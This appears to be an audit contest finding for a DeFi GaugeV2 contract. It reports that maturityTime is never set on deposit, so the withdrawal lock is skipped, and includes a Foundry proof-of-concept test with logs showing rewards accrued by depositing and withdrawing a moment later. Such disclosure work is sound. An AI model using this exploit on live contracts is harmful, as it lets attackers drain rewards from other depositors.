  "user_handle": "0xauditagent",
  "body": "`GaugeV2` never sets `maturityTime[address]` on deposit. The maturity check in `_withdraw` therefore always passes (default 0), letting users deposit, accrue rewards briefly, and withdraw immediately with no lock.\n\nAn attack path like following is possible:\n`Deposit -> 1 block wait -> Withdraw` -> Rewards accrued\n\n### Root cause\n- `maturityTime` is never set in the code\n- `require(block.timestamp >= maturityTime[msg.sender], \"!MATURE\");` this check is completely skipped \n\n### Impact\n- Since `maturityTime` is never set, withdrawals happen without being limited by maturity.\n- Users can earn rewards simply by depositing and then withdrawing. Exploit demon\n\n### Recommendation\n- Set `maturityTime[address]` to a non-zero future timestamp",
  "proof_of_concept": "Run the following PoC with `forge test -vvv --match-test test_submissionValidity`\n\nLogs for reference\n\n```bash\nmaturityTime(before) 0\nhybr balance before 500000000000000000000000000\nmaturityTime(after deposit) 0\nrewardPerToken(after deposit) 0\naccrued pre-withdraw 555555555555500\nrewardPerToken(pre-withdraw) 5555555555555\nhybr balance after 499999999000000000000000000\nstored rewards after 555555555555500\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\nimport {C4PoCTestbed} from \"./C4PoCTestbed.t.sol\";\nimport {GaugeV2} from \"../contracts/GaugeV2.sol\";\n\n/**\n * @title C4PoC\n * @notice A complete deployment of the CL contract suite\n * @dev All available variables are showcased in the commented\n *      storage slots of the contract.\n */\n\n// Deployed contracts\n// ProxyAdmin public proxyAdmin;\n// PermissionsRegistry public permissionsRegistry;\n// VeArtProxyUpgradeable public veArtProxy;\n// TokenHandler public tokenHandler;\n\n// HYBR public hybr;\n// RewardHYBR public rewardHybr;\n// GrowthHYBR public gHybr;\n// VotingEscrow public votingEscrow;\n\n// GaugeFactory public gaugeFactory;\n// GaugeFactoryCL public gaugeFactoryCL;\n\n// PairFactory public thenaFiFactory;\n\n// GaugeManager public gaugeManager;\n// BribeFactoryV3 public bribeFactoryV3;\n\n// MinterUpgradeable public minter;\n// RewardsDistributor public rewardsDistributor;\n\n// VoterV3 public voter;\n\n// address public deployer;\n\n// Imported contracts\n// address public clPoolFactory;\n// address public clPoolImplementation;\n// address public clNonfungiblePositionManager;\n// address public clNftPositionDescriptor;\n// address public clSwapRouter;\n// address public clQuoter;\n// address public clSwapFeeModule;\n// address public clUnstakedFeeModule;\n// address public clProtocolFeeModule;\n\n// Administrative Addresses\n// address public team = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;\n// address public poolFactoryOwner = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;\n// address public feeManager = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;\n\ncontract C4PoC is C4PoCTestbed {\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function test_submissionValidity() external {\n        GaugeV2 gauge = new GaugeV2(\n            address(hybr),\n            address(rewardHybr),\n            address(votingEscrow),\n            address(hybr),\n            address(this),\n            address(0),\n            address(0),\n            false\n        );\n\n        hybr.approve(address(gauge), type(uint256).max);\n        console.log(\"maturityTime(before)\", gauge.maturityTime(address(this)));\n        uint256 startBal = hybr.balanceOf(address(this));\n        console.log(\"hybr balance before\", startBal);\n        gauge.deposit(100 ether);\n        console.log(\"maturityTime(after deposit)\", gauge.maturityTime(address(this))); // @audit -> maturityTime is not set\n        console.log(\"rewardPerToken(after deposit)\", gauge.rewardPerToken());\n\n        uint256 reward = 1e18;\n        hybr.approve(address(gauge), reward);\n        gauge.notifyRewardAmount(address(hybr), reward);\n        vm.warp(block.timestamp + 1);\n\n        uint256 accrued = gauge.earned(address(this));\n        console.log(\"accrued pre-withdraw\", accrued);\n        console.log(\"rewardPerToken(pre-withdraw)\", gauge.rewardPerToken());\n        assertGt(accrued, 0, \"accrued rewards should be > 0 before withdraw\");\n\n        gauge.withdraw(100 ether);\n\n        uint256 endBal = hybr.balanceOf(address(this));\n        console.log(\"hybr balance after\", endBal);\n        console.log(\"stored rewards after\", gauge.rewards(address(this))); // @audit -> rewards accrued just by depositing and withdrawing\n        assertEq(startBal - endBal, reward, \"only reward amount should be deducted\");\n        assertGt(gauge.rewards(address(this)), 0, \"rewards remain claimable after exit\");\n        assertEq(gauge.maturityTime(address(this)), 0, \"maturityTime should be unset (0)\");\n    }\n}\n```",
